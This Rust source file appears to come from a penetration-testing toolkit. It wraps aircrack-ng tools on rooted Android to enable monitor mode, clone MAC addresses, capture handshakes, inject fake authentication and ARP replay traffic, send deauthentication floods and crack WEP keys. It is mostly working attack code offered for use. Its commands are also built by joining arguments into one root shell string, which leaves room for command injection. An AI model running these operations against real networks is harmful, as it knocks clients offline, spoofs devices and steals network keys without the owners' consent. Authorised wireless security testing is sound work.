//! WiFi attack operations for rooted Android devices
//!
//! Uses `su -c` to run aircrack-ng suite commands with root privileges.
//! These commands run directly on the device (not in proot) since they
//! need real hardware access to the WiFi chipset.

use crate::traits::*;
use async_trait::async_trait;
use pentest_core::error::{Error, Result};
use std::process::Stdio;
use std::time::Duration;
use tokio::process::Command;

use super::AndroidPlatform;

/// Run a command via `su -c` for root access on Android.
async fn su_cmd(args: &[&str]) -> std::result::Result<std::process::Output, Error> {
    let cmd_str = args.join(" ");
    Command::new("su")
        .args(["-c", &cmd_str])
        .output()
        .await
        .map_err(|e| {
            Error::ToolExecution(format!(
                "Failed to run '{}' via su (is the device rooted?): {}",
                cmd_str, e
            ))
        })
}

/// Spawn a background command via `su -c` and return the child process.
fn su_spawn(args: &[&str]) -> std::result::Result<tokio::process::Child, Error> {
    let cmd_str = args.join(" ");
    Command::new("su")
        .args(["-c", &cmd_str])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| {
            Error::ToolExecution(format!(
                "Failed to spawn '{}' via su (is the device rooted?): {}",
                cmd_str, e
            ))
        })
}

#[async_trait]
impl WifiAttackOps for AndroidPlatform {
    async fn enable_monitor_mode(
        &self,
        interface: &str,
        allow_kill_network_manager: bool,
    ) -> Result<(String, bool)> {
        tracing::info!("Enabling monitor mode on {} (Android/root)", interface);

        // Check if already in monitor mode
        let iw_info = su_cmd(&["iw", "dev", interface, "info"]).await;
        if let Ok(output) = iw_info {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if stdout.contains("type monitor") {
                tracing::info!("Interface {} already in monitor mode", interface);
                return Ok((interface.to_string(), false));
            }
        }

        // Check if monitor variant exists
        let mon_variant = format!("{}mon", interface);
        let iw_mon = su_cmd(&["iw", "dev", &mon_variant, "info"]).await;
        if let Ok(output) = iw_mon {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if stdout.contains("type monitor") {
                tracing::info!("Monitor interface {} already exists", mon_variant);
                return Ok((mon_variant, false));
            }
        }

        // Try airmon-ng first
        tracing::info!("Attempting airmon-ng start {}...", interface);
        let output = su_cmd(&["airmon-ng", "start", interface]).await?;

        if !output.status.success() {
            if !allow_kill_network_manager {
                let stderr = String::from_utf8_lossy(&output.stderr);
                return Err(Error::ToolExecution(format!(
                    "Monitor mode failed. Run with allow_network_disruption=true to kill interfering processes. Error: {}",
                    stderr
                )));
            }

            // Kill interfering processes and retry
            tracing::warn!("Killing interfering processes...");
            let _ = su_cmd(&["airmon-ng", "check", "kill"]).await;

            let output = su_cmd(&["airmon-ng", "start", interface]).await?;
            if !output.status.success() {
                let stderr = String::from_utf8_lossy(&output.stderr);
                return Err(Error::ToolExecution(format!(
                    "airmon-ng failed after killing processes: {}",
                    stderr
                )));
            }

            let stdout = String::from_utf8_lossy(&output.stdout);
            let mon_iface = parse_monitor_interface(&stdout, interface);
            tracing::info!("Monitor mode enabled: {}", mon_iface);
            return Ok((mon_iface, true));
        }

        let stdout = String::from_utf8_lossy(&output.stdout);
        let mon_iface = parse_monitor_interface(&stdout, interface);
        tracing::info!("Monitor mode enabled: {}", mon_iface);
        Ok((mon_iface, false))
    }

    async fn disable_monitor_mode(
        &self,
        interface: &str,
        restart_network_manager: bool,
    ) -> Result<()> {
        tracing::info!("Disabling monitor mode on {}", interface);

        let iw_info = su_cmd(&["iw", "dev", interface, "info"]).await;
        let is_monitor = iw_info
            .map(|o| String::from_utf8_lossy(&o.stdout).contains("type monitor"))
            .unwrap_or(false);

        if is_monitor {
            let _ = su_cmd(&["airmon-ng", "stop", interface]).await;
        }

        if restart_network_manager {
            // On Android, restart wpa_supplicant instead of NetworkManager
            let _ = su_cmd(&["svc", "wifi", "enable"]).await;
            tokio::time::sleep(Duration::from_secs(2)).await;
        }

        Ok(())
    }

    async fn clone_mac(&self, interface: &str, target_mac: &str) -> Result<()> {
        tracing::info!("Cloning MAC on {} to {}", interface, target_mac);

        su_cmd(&["ip", "link", "set", interface, "down"]).await?;
        let output = su_cmd(&["ip", "link", "set", interface, "address", target_mac]).await?;
        su_cmd(&["ip", "link", "set", interface, "up"]).await?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(Error::ToolExecution(format!("MAC clone failed: {}", stderr)));
        }

        Ok(())
    }

    async fn test_injection(&self, interface: &str) -> Result<InjectionCapability> {
        tracing::info!("Testing injection on {}", interface);

        let output = su_cmd(&["aireplay-ng", "--test", interface]).await?;
        let stdout = String::from_utf8_lossy(&output.stdout);

        let mut supported = false;
        let mut success_rate = 0.0;

        for line in stdout.lines() {
            if line.contains("/") && line.contains("%") {
                supported = true;
                if let Some(pct_str) = line
                    .split('%')
                    .next()
                    .and_then(|s| s.split_whitespace().last())
                {
                    if let Ok(pct) = pct_str.parse::<f32>() {
                        success_rate = pct / 100.0;
                    }
                }
                break;
            }
        }

        Ok(InjectionCapability {
            supported,
            success_rate,
        })
    }

    async fn start_capture(
        &self,
        interface: &str,
        bssid: &str,
        channel: u8,
        output_file: &str,
    ) -> Result<WifiCaptureHandle> {
        tracing::info!(
            "Starting capture on {} for {} (ch {})",
            interface,
            bssid,
            channel
        );

        let channel_str = channel.to_string();
        let child = su_spawn(&[
            "airodump-ng",
            "--bssid",
            bssid,
            "--channel",
            &channel_str,
            "-w",
            output_file,
            "--output-format",
            "pcap",
            interface,
        ])?;

        let pid = child
            .id()
            .ok_or_else(|| Error::ToolExecution("Failed to get airodump-ng PID".into()))?;

        tracing::info!("Capture started (PID: {})", pid);

        Ok(WifiCaptureHandle {
            pid,
            output_file: output_file.to_string(),
            interface: interface.to_string(),
        })
    }

    async fn stop_capture(&self, handle: WifiCaptureHandle) -> Result<()> {
        tracing::info!("Stopping capture (PID: {})", handle.pid);
        let pid_str = handle.pid.to_string();
        let _ = su_cmd(&["kill", &pid_str]).await;
        tokio::time::sleep(Duration::from_millis(500)).await;
        Ok(())
    }

    async fn get_capture_stats(&self, handle: &WifiCaptureHandle) -> Result<WifiCaptureStats> {
        let cap_file = format!("{}-01.cap", handle.output_file);
        let output = su_cmd(&["aircrack-ng", &cap_file]).await?;
        let stdout = String::from_utf8_lossy(&output.stdout);

        let mut ivs = 0;
        let mut has_handshake = false;

        for line in stdout.lines() {
            if line.contains("#Data") {
                if let Some(data_str) = line.split_whitespace().nth(1) {
                    ivs = data_str.parse().unwrap_or(0);
                }
            }
            if line.contains("handshake") || line.contains("1 handshake") {
                has_handshake = true;
            }
        }

        Ok(WifiCaptureStats {
            packets: ivs as u64,
            ivs,
            has_handshake,
            data_packets: ivs as u64,
        })
    }

    async fn fake_auth(&self, interface: &str, bssid: &str) -> Result<()> {
        tracing::info!("Fake auth to {}", bssid);

        let output = su_cmd(&["aireplay-ng", "--fakeauth", "0", "-a", bssid, interface]).await?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(Error::ToolExecution(format!(
                "Fake auth failed: {}",
                stderr
            )));
        }

        Ok(())
    }

    async fn start_arp_replay(&self, interface: &str, bssid: &str) -> Result<ArpReplayHandle> {
        tracing::info!("Starting ARP replay on {}", bssid);

        let child = su_spawn(&["aireplay-ng", "--arpreplay", "-b", bssid, interface])?;

        let pid = child
            .id()
            .ok_or_else(|| Error::ToolExecution("Failed to get aireplay-ng PID".into()))?;

        Ok(ArpReplayHandle { pid })
    }

    async fn stop_arp_replay(&self, handle: ArpReplayHandle) -> Result<()> {
        let pid_str = handle.pid.to_string();
        let _ = su_cmd(&["kill", &pid_str]).await;
        Ok(())
    }

    async fn deauth_attack(
        &self,
        interface: &str,
        bssid: &str,
        client: Option<&str>,
        count: u8,
    ) -> Result<()> {
        let target = client.unwrap_or("broadcast");
        tracing::info!("Deauth {} packets to {} on {}", count, target, bssid);

        let count_str = count.to_string();
        let mut args = vec!["aireplay-ng", "--deauth", &count_str, "-a", bssid];

        if let Some(c) = client {
            args.push("-c");
            args.push(c);
        }

        args.push(interface);

        let output = su_cmd(&args).await?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            tracing::warn!("Deauth may have failed: {}", stderr);
        }

        Ok(())
    }

    async fn verify_handshake(&self, capture_file: &str, bssid: &str) -> Result<bool> {
        let cap_file = format!("{}-01.cap", capture_file);
        let output = su_cmd(&["aircrack-ng", "-b", bssid, &cap_file]).await?;
        let stdout = String::from_utf8_lossy(&output.stdout);

        let has = stdout.contains("1 handshake") || stdout.contains("handshake");
        Ok(has)
    }

    async fn crack_wep(&self, capture_file: &str, bssid: &str) -> Result<Option<String>> {
        let cap_file = format!("{}-01.cap", capture_file);
        let output = su_cmd(&["aircrack-ng", "-b", bssid, &cap_file]).await?;
        let stdout = String::from_utf8_lossy(&output.stdout);

        for line in stdout.lines() {
            if line.contains("KEY FOUND!") {
                if let Some(key_part) = line.split('[').nth(1) {
                    if let Some(key) = key_part.split(']').next() {
                        let key = key.trim().to_string();
                        tracing::info!("WEP key found: {}", key);
                        return Ok(Some(key));
                    }
                }
            }
        }

        Ok(None)
    }
}

/// Parse the monitor interface name from airmon-ng output.
fn parse_monitor_interface(stdout: &str, original: &str) -> String {
    if let Some(line) = stdout
        .lines()
        .find(|l| l.contains("monitor mode") && l.contains("enabled"))
    {
        if let Some(word) = line.split_whitespace().next() {
            if word.contains("mon") {
                return word.to_string();
            }
        }
    }
    format!("{}mon", original)
}
